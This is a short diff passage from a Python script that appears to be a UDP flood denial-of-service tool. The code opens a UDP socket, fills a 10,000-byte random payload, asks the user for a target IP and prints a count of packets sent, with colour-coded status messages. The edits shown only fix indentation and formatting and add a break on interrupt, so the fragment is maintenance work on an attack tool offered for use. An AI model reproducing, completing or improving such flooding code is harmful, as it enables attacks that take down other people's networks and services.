@@ -18,7 +18,7 @@ def all():
 -----------------------------
 \033[m""")                                                              
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(10000)
+	bytes = random._urandom(10000)
 	try:
 		print("\033[32mEnter target IP \033[m\033[m", end=": ")
 		ip = input("\033[36m")
@@ -51,14 +51,14 @@ Reason: \033[33m{e}\033[m""")
 					print(f"\033[35mPackages sent \033[m: \033[36m{i}\033[m", end="\r")
 			except Exception as e:
 				print(f"""------------------------------
-		\033[91mProgram ending.
-		Reason: \033[33m{e}\033[m
+\033[91mProgram ending.
+Reason: \033[33m{e}\033[m
 		------------------------------""")
 				exit()
 			except KeyboardInterrupt:
-				print("""-----------------------------------
-\033[33mProgam ending! check back often!\033[m
+				print("""-----------------------------------\033[33mProgam ending! check back often!\033[m
 ------------------------------------""")
+				break
 		elif lines=="2":
 			sleep(1.5)
 			try:
